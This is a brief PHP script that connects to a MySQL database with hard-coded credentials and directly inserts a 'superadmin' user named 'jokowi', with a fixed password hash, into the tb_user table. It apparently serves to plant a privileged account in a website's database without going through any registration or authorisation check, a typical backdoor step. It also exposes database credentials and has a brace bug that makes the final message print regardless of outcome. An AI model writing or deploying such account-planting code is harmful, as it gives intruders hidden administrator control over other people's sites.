<?php
$conn =new mysqli('localhost', 'sakurat2_db', 'sakurat2_db' , 'sakurat2_db'); 
   
    
    

        $query = "INSERT INTO `tb_user` (`cuid`, `user`, `pass`, `token_id`, `image`, `full_name`, `email`, `no_hp`, `level`, `pinTrx`, `reff`, `uplineID`, `join_date`, `last_login`, `status`) VALUES
(5, 'jokowi', '$2y$10$OVRTFcwKLk13TqInDOTIDOklEEUNwCoNp0M6ilQaTvZeJgtLwOXvG', 21, 'avatar5.png', '', '', '', 'superadmin', 'd41d8cd98f00b204e9800998ecf8427e', 0, 1, '2023-10-23 06:07:26', '2023-10-24 10:36:25', 1);
";
        $result = mysqli_query($conn, $query);
        if($result){
            $msg = "Registered Sussecfully";
            echo $msg;
        }
        else
            $msg = "Error Registering";
            echo $msg;
    
?>
